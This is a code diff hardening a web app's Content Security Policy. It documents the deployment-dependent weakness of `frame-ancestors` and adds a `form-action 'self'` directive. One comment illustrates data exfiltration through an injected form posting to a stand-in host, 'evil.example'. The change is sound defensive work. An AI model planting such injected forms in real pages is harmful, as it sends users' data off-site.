@@ -15,6 +15,16 @@
  * scripts), so script execution is restricted to same-origin files plus the
  * `'wasm-unsafe-eval'` the SQLite WASM module needs to instantiate.
  *
+ * ## `frame-ancestors` is only as strong as the deployment
+ *
+ * `frame-ancestors` cannot be expressed in a `<meta>` (see `META_UNSUPPORTED_DIRECTIVES`), so it
+ * reaches the browser only on the service worker's response header — which needs the worker
+ * installed *and* controlling the page. The Docker image closes that gap itself
+ * (`docker/security-headers.conf` sends `X-Frame-Options: DENY`), but GitHub Pages sends no
+ * headers of its own, so a first-ever visit to the hosted build, or a deep link reached before
+ * the worker takes over, is frameable. Every other directive is carried by the `<meta>` from the
+ * very first byte; this is the one that is deployment-dependent (issue #517).
+ *
  * ## The one origin the user supplies (issue #385)
  *
  * Everything above is fixed at build time. One thing cannot be: the **bridge**, which lives
@@ -62,6 +72,13 @@ export const CSP_DIRECTIVES: ReadonlyArray<readonly [name: string, value: string
   ['manifest-src', "'self'"],
   ['object-src', "'none'"],
   ['base-uri', "'self'"],
+  // `form-action` does not fall back to `default-src`, so omitting it leaves form submission
+  // unrestricted even though everything else is locked to `'self'`. With inline script already
+  // forbidden, an injected `<form action="https://evil.example">` (or a `formaction` on a submit
+  // button) would be a remaining way to push data off-origin. Nothing in the app submits a
+  // form anywhere: every form is handled in JavaScript, and the Google Drive consent step is a
+  // top-level navigation rather than a form post, so `'self'` costs nothing (issue #517).
+  ['form-action', "'self'"],
   ['frame-ancestors', "'none'"],
 ];
 
